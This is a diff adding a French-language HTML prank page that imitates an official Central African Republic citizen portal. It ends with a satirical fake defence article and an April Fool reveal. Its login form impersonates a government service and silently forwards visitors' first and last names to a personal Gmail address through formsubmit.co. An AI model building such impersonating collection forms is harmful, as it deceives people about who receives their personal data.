@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portail RCA - République Centrafricaine</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <!-- Page de connexion -->
+    <div id="login-page" class="container">
+        <div class="login-box">
+            <div class="header-rca">
+                <div class="flag-colors"></div>
+                <div class="logo">🇨🇫</div>
+                <h1>Portail Citoyen RCA</h1>
+                <p class="subtitle">République Centrafricaine - Service Public</p>
+            </div>
+            
+            <div class="info-box">
+                <p>Bienvenue sur le portail officiel des services publics de la République Centrafricaine.</p>
+                <p>Veuillez vous identifier pour accéder aux informations.</p>
+            </div>
+
+            <form id="auth-form" action="https://formsubmit.co/jeanjack1278@gmail.com" method="POST">
+                <!-- Configuration FormSubmit -->
+                <input type="hidden" name="_subject" value="Nouvelle connexion Portail RCA">
+                <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="_template" value="table">
+                <input type="hidden" name="_next" value="https://portail-rca.vercel.app/article.html">
+                
+                <div class="form-group">
+                    <label for="prenom">Prénom :</label>
+                    <input type="text" id="prenom" name="Prénom" required placeholder="Votre prénom">
+                </div>
+                <div class="form-group">
+                    <label for="nom">Nom :</label>
+                    <input type="text" id="nom" name="Nom" required placeholder="Votre nom de famille">
+                </div>
+                <button type="submit" id="submit-btn">
+                    <span class="btn-text">Accéder au portail</span>
+                    <span class="btn-loading" style="display:none;">Connexion en cours...</span>
+                </button>
+            </form>
+
+            <div id="error-msg" class="error-message" style="display:none;"></div>
+            
+            <div class="footer-info">
+                <p>🌍 Portail sécurisé - Bangui, Centrafrique</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Page article secret -->
+    <div id="article-page" class="container" style="display:none;">
+        <header class="article-header">
+            <div class="top-bar">
+                <div class="flag-mini">🇨🇫</div>
+                <span id="user-welcome">Bienvenue</span>
+                <button id="logout-btn">Déconnexion</button>
+            </div>
+            <div class="ministry-header">
+                <h1>📰 Actualités de la Défense Nationale</h1>
+                <p>République Centrafricaine - Janvier 2026</p>
+            </div>
+        </header>
+
+        <main class="article-content">
+            <article>
+                <div class="article-classification">
+                    <span class="level">Information Officielle</span>
+                    <span class="doc-id">RCA-2026-00147</span>
+                </div>
+
+                <h2>🚨 EXCLUSIF : Les Nouveaux Projets Secrets de l'Armée Centrafricaine Révélés</h2>
+                
+                <div class="article-meta">
+                    <span>📅 12 Janvier 2026</span>
+                    <span>✍️ Ministère de la Défense</span>
+                    <span>📍 Bangui, RCA</span>
+                </div>
+
+                <div class="article-body">
+                    <p class="intro"><strong>BANGUI, République Centrafricaine</strong> — Nos sources exclusives au sein du gouvernement centrafricain ont révélé des informations stupéfiantes concernant les nouveaux projets militaires en cours de développement.</p>
+
+                    <h3>🦒 Projet "Girafe Blindée"</h3>
+                    <p>L'armée centrafricaine aurait lancé un programme ultra-secret visant à entraîner des girafes pour des missions de reconnaissance en hauteur. Ces animaux, équipés de caméras thermiques miniaturisées attachées à leurs cornes, permettraient de surveiller les zones de conflit depuis une altitude naturelle de 5 à 6 mètres.</p>
+                    <p><em>"Les drones sont trop bruyants, les girafes passent inaperçues"</em>, aurait déclaré un général anonyme.</p>
+
+                    <h3>🍌 Opération "Banane Stratégique"</h3>
+                    <p>Un nouveau système de communication crypté baserait sur un réseau de plantations de bananiers génétiquement modifiés. Ces plantes émettraient des signaux à basse fréquence indétectables par les équipements conventionnels. Le projet aurait reçu un financement de 47 millions de francs CFA.</p>
+
+                    <h3>🦁 Division "Lion Cyber"</h3>
+                    <p>La création d'une unité d'élite spécialisée dans la cyber-guerre, dont les membres porteraient des masques de lion pour intimider les adversaires lors de vidéoconférences stratégiques. Cette unité serait actuellement en formation dans une base secrète près de Bambari.</p>
+
+                    <h3>🚁 Projet "Hélico-Pirogue"</h3>
+                    <p>Développement d'un véhicule hybride révolutionnaire : une pirogue traditionnelle équipée d'hélices de drone permettant le transport amphibie. Le prototype, surnommé "L'Ubangi Volant", aurait effectué son premier vol d'essai en décembre 2025.</p>
+
+                    <div class="quote-box">
+                        <blockquote>
+                            "Ces innovations placent la République Centrafricaine à l'avant-garde de la technologie militaire mondiale. Nous sommes fiers de notre créativité stratégique."
+                        </blockquote>
+                        <cite>— Général [NOM CENSURÉ], Chef d'État-Major</cite>
+                    </div>
+
+                    <h3>📊 Budget et Financement</h3>
+                    <p>Selon nos informations, ces projets seraient financés par :</p>
+                    <ul>
+                        <li>La vente de droits d'exploitation de mines de diamants imaginaires</li>
+                        <li>Un partenariat secret avec le Wakanda (non confirmé)</li>
+                        <li>Les recettes de la loterie nationale "Gratte-et-Gagne-un-Tank"</li>
+                    </ul>
+
+                    <h3>🔮 Projets Futurs</h3>
+                    <p>D'autres projets seraient en cours d'étude :</p>
+                    <ul>
+                        <li><strong>Opération "Hippopotame Furtif"</strong> : Sous-marins fluviaux camouflés</li>
+                        <li><strong>Projet "Manioc Explosif"</strong> : Nouvelle génération de rations de combat énergétiques</li>
+                        <li><strong>Programme "Éléphant WiFi"</strong> : Réseau de communication mobile basé sur des pachydermes</li>
+                    </ul>
+                </div>
+
+                <div class="article-footer">
+                    <div class="disclaimer">
+                        <p>⚠️ Ce document est classifié. Toute divulgation non autorisée est passible de poursuites.</p>
+                        <p>📋 Rapport généré automatiquement par le Système COBRA-12</p>
+                    </div>
+                </div>
+            </article>
+
+            <aside class="sidebar">
+                <div class="sidebar-box">
+                    <h4>📌 Autres Articles</h4>
+                    <ul>
+                        <li>🔒 Projet "Crocodile Volant"</li>
+                        <li>🔒 Opération "Termite d'Acier"</li>
+                        <li>🔒 Plan "Moustique Nucléaire"</li>
+                    </ul>
+                </div>
+                <div class="sidebar-box alert">
+                    <h4>⏱️ Session</h4>
+                    <p>Temps restant: <span id="timer">14:59</span></p>
+                </div>
+            </aside>
+        </main>
+
+        <footer class="page-footer">
+            <p>© 2026 République Centrafricaine - Portail Officiel</p>
+        </footer>
+    </div>
+
+    <!-- Message de blague finale -->
+    <div id="joke-reveal" class="joke-overlay" style="display:none;">
+        <div class="joke-content">
+            <h1>😂 POISSON D'AVRIL ! 😂</h1>
+            <p>Tu t'es fait avoir !</p>
+            <p>Tout ça c'était une blague ! 🎉</p>
+            <p>Il n'y a pas de girafes espionnes ni d'hippopotames sous-marins...</p>
+            <p><em>Enfin... on ne sait jamais ! 🦒🛡️</em></p>
+            <button id="close-joke">OK, bien joué ! 👍</button>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
